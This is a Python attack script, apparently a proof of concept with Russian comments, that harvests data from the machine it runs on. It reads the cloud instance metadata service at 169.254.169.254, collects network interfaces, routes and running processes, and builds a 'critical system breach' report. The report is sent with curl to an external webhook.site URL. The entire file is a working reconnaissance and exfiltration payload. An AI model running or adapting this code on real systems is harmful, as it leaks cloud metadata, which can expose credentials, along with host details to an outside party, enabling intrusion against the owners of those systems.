import subprocess
import os
import http.client

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def get_cloud_data():
    """Попытка вытащить реальные данные из метаданных облака."""
    try:
        conn = http.client.HTTPConnection("169.254.169.254", timeout=2)
        # Запрашиваем список доступных метаданных
        conn.request("GET", "/latest/meta-data/")
        r = conn.getresponse()
        if r.status == 200:
            return r.read().decode()[:500] # Берем первые 500 символов
    except:
        return "No direct metadata response"
    return "Metadata server timed out"

def get_network_info():
    """Собираем данные о сетевом окружении."""
    try:
        # Показываем все интерфейсы и маршруты
        ip_addr = subprocess.check_output(["ip", "addr"]).decode()
        ip_route = subprocess.check_output(["ip", "route"]).decode()
        return f"INTERFACES:\n{ip_addr}\n\nROUTES:\n{ip_route}"
    except:
        return "Could not retrieve network info"

def run_attack():
    print("[*] Harvesting sensitive data...")
    
    # 1. Данные из облака
    cloud_info = get_cloud_data()
    
    # 2. Сетевая топология
    net_info = get_network_info()
    
    # 3. Список процессов (чтобы видеть, что запущено на фоне)
    try:
        ps_info = subprocess.check_output(["ps", "aux"]).decode()[:1000]
    except:
        ps_info = "PS command failed"

    # Формируем читаемый и "пугающий" отчет
    report = (
        "========== [ LUMOS: CRITICAL SYSTEM BREACH ] ==========\n"
        f"STATUS: ROOT IDENTIFIED (UID {os.getuid()})\n"
        "------------------------------------------------------\n"
        "[!] CLOUD METADATA EXPOSED:\n"
        f"{cloud_info}\n"
        "------------------------------------------------------\n"
        "[!] NETWORK TOPOLOGY REVEALED:\n"
        f"{net_info}\n"
        "------------------------------------------------------\n"
        "[!] RUNNING PROCESSES (Partial):\n"
        f"{ps_info}\n"
        "======================================================"
    )

    # Отправляем в чистом виде, чтобы не было путаницы с кодировкой
    subprocess.run([
        'curl', '-s', 
        '-X', 'POST', 
        '--data-urlencode', f"payload={report}", 
        WEBHOOK_URL
    ])
    print("[+] Critical data sent to webhook.")

if __name__ == "__main__":
    run_attack()
